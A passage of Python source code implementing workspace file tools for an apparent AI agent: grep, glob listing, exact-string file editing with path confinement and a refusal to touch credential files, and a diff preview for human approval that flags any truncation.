            blob = p.read_bytes()
        except OSError:
            continue
        if b"\x00" in blob[:8192]:                     # binary
            continue
        for i, line in enumerate(blob.decode("utf-8", "replace").splitlines(), 1):
            if rx.search(line):
                out.append(f"{rel}:{i}: {line.strip()[:300]}")
                if len(out) >= _GREP_MAX_MATCHES:
                    truncated = True
                    break
        if truncated:
            break
    if truncated:
        out.append(f"…[truncated at {_GREP_MAX_MATCHES} matches — "
                   "narrow the pattern or glob]")
    return "\n".join(out) or "No matches."


def glob_files(pattern: str, path: str = ".") -> str:
    """List workspace files matching a glob pattern ('**/*.py' style),
    newest-modified first — 'what did we just touch' sorts to the top."""
    try:
        root = _confine(path)
    except ValueError as err:
        return f"Error: {err}"
    if not root.is_dir():
        return f"Error: no such directory in workspace: {path}"
    base, hits = workdir(), []
    for p in _walk_files(root):
        rel = p.relative_to(base).as_posix()
        if _glob_match(rel, p.name, pattern):
            try:
                hits.append((p.stat().st_mtime, rel))
            except OSError:
                continue
    hits.sort(reverse=True)
    return "\n".join(rel for _, rel in hits[:500]) or "No matches."


def edit_file(path: str, old_string: str, new_string: str,
              replace_all: bool = False, *,
              root: str | Path | None = None) -> dict:
    """Exact-string replacement in a workspace file — the execute half of the
    'edit_file' ActionType. Result carries the prior content (undo_write
    reverses it) and the same post-write `check` as write_file. `root` pins the
    previewed workspace root (see `_effective_root`)."""
    target = _confine(path, root)
    if not target.is_file():
        raise ValueError(f"no such file in workspace: {path}")
    if is_sensitive_path(target):
        raise ValueError(f"refusing to edit a credential file: {path}")
    if not old_string:
        raise ValueError("old_string must be non-empty")
    if old_string == new_string:
        raise ValueError("old_string and new_string are identical")
    prior = target.read_text(encoding="utf-8", errors="replace")
    n = prior.count(old_string)
    if n == 0:
        raise ValueError(f"old_string not found in {path}")
    if n > 1 and not replace_all:
        raise ValueError(f"old_string occurs {n} times in {path} — make it "
                         "unique (add surrounding lines) or set replace_all")
    content = (prior.replace(old_string, new_string) if replace_all
               else prior.replace(old_string, new_string, 1))
    target.write_text(content, encoding="utf-8")
    return {"path": str(target), "existed": True, "prior": prior,
            "replacements": n if replace_all else 1,
            "bytes": len(content.encode("utf-8")),
            "check": check_written(target, content)}


def edit_file_diff(path: str, old_string: str, new_string: str,
                   replace_all: bool = False, *,
                   root: str | Path | None = None) -> str:
    """Unified diff of what edit_file WOULD do — the preview half. Never
    writes. Returns the diff, or the reason the edit cannot apply."""
    import difflib
    try:
        target = _confine(path, root)
    except ValueError as err:
        return f"(cannot apply: {err})"
    if not target.is_file():
        return f"(cannot apply: no such file in workspace: {path})"
    if is_sensitive_path(target):
        return f"(cannot apply: refusing to edit a credential file: {path})"
    prior = target.read_text(encoding="utf-8", errors="replace")
    n = prior.count(old_string) if old_string else 0
    if n == 0:
        return f"(cannot apply: old_string not found in {path})"
    if n > 1 and not replace_all:
        return (f"(cannot apply: old_string occurs {n} times in {path} — "
                "make it unique or set replace_all)")
    after = (prior.replace(old_string, new_string) if replace_all
             else prior.replace(old_string, new_string, 1))
    diff = difflib.unified_diff(prior.splitlines(keepends=True),
                                after.splitlines(keepends=True),
                                fromfile=f"a/{path}", tofile=f"b/{path}")
    text = "".join(diff)
    if not text:
        return "(no textual change)"
    # The preview goes on a human approval card. If it's too big to show whole,
    # say so explicitly — never present a silently-truncated diff as the full
    # change an approver is signing off on.
    if len(text) > 4_000:
        return (text[:4_000] + f"\n… [diff truncated — showing 4000 of "
                f"{len(text)} characters; the FULL edit will apply if "
                "approved. Review the complete change before approving.]")
    return text


def list_dir(path: str = ".") -> str:
    try:
        target = _confine(path)
    except ValueError as err:
        return f"Error: {err}"
    if not target.exists():
        return f"Error: no such path in workspace: {path}"
    if target.is_file():
        return target.name
    entries = []
    for p in sorted(target.iterdir()):
        entries.append(f"{p.name}/" if p.is_dir() else p.name)
    return "\n".join(entries) or "(empty)"
